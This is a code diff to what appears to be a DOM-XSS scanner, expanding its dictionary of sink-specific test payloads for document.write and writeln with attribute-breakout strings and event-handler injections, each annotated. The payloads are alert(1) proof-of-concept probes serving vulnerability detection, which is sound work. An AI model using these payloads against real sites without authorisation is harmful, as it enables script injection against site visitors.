@@ -35,12 +35,41 @@ _STABILIZE_TIMEOUT_MS = 3_000
 _BLOCKED_RESOURCE_TYPES = {"image", "media", "font", "stylesheet"}
 
 # Sink-appropriate XSS payloads.  Ordered most targeted → most generic.
+# document.write / writeln payloads include attribute-escape variants ('><...)
+# because these sinks often write attacker data *inside* an HTML attribute
+# (e.g. document.write("<iframe src='..."+location.search+"'...>")).
+# The breakout prefix closes the attribute and injects the XSS element.
 _SINK_PAYLOADS: dict[str, list[str]] = {
     "innerHTML":          ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<details open ontoggle=alert(1)>"],
     "outerHTML":          ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
     "insertAdjacentHTML": ["<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"],
-    "document.write":     ["<img src=x onerror=alert(1)>", "<script>alert(1)<\\/script>"],
-    "document.writeln":   ["<img src=x onerror=alert(1)>", "<script>alert(1)<\\/script>"],
+    "document.write":     [
+        # Direct HTML injection (sink writes raw HTML into the page body)
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        # Attribute-escape with new tags (works when < > reach the sink unencoded)
+        "'><img src=x onerror=alert(1)>",
+        "'><svg onload=alert(1)>",
+        "\"><img src=x onerror=alert(1)>",
+        "\"><svg onload=alert(1)>",
+        # Attribute-escape WITHOUT angle brackets — for URL fragment injection where
+        # the browser encodes < and > in window.location but leaves ' and = intact.
+        # Closes the src attribute and injects an event handler into the same tag.
+        # e.g. <iframe src='URL#'onload='alert(1)' ...> fires onload.
+        "'onload='alert(1)",
+        "'onmouseover='alert(1)",
+        "\"onload=\"alert(1)",
+    ],
+    "document.writeln":   [
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "'><img src=x onerror=alert(1)>",
+        "'><svg onload=alert(1)>",
+        "\"><img src=x onerror=alert(1)>",
+        "\"><svg onload=alert(1)>",
+        "'onload='alert(1)",
+        "\"onload=\"alert(1)",
+    ],
     "eval":               ["alert(1)", "alert`1`"],
     "Function":           ["alert(1)", "alert`1`"],
     "setTimeout":         ["alert(1)", "alert`1`"],
